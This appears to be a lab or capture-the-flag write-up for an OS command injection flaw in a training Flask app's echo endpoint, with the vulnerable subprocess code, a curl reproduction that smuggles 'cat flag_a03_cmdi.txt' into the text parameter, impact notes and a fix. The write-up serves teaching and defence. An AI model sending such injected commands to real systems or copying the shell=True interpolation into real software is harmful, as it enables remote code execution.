# A03:2021 - Injection (OS Command Injection)

**Endpoint:** `GET /a03-cmdi/echo`
**Severity:** Critical

## Vulnerability

The diagnostic "echo" endpoint passes the raw `text` query parameter into a
shell command:

```python
# app/challenges/a03_cmdi.py
result = subprocess.run(
    f"echo {text}", shell=True, capture_output=True, text=True, timeout=5
)
```

`shell=True` plus unsanitized interpolation means any shell metacharacter
(`;`, `|`, `&&`, backticks, `$()`) lets an attacker run arbitrary commands
with the privileges of the Flask process.

## Reproduce

```bash
curl -s -G http://localhost:5000/a03-cmdi/echo \
  --data-urlencode 'text=hi; cat flag_a03_cmdi.txt'
```

```json
{"stdout": "hi\nFLAG{command_injection_rce}\n", "stderr": ""}
```

Note: this requires a POSIX shell (`;` as a command separator). Run it
against the Docker container, not a native Windows shell.

## Impact

Remote code execution as the application user — full read/write on the
container filesystem, pivot point to anything else reachable from there
(e.g. the SSRF target in the A10 challenge).

## Fix

Never build shell commands from user input. If shelling out is truly
necessary, pass arguments as a list with `shell=False`:

```python
result = subprocess.run(["echo", text], capture_output=True, text=True, timeout=5)
```

That alone neutralizes the injection, since there's no shell parsing the
string. Better still: don't expose a "run this on the server" feature at
all if it can be avoided.

## Reference

[OWASP Top 10 2021 - A03 Injection](https://owasp.org/Top10/A03_2021-Injection/)
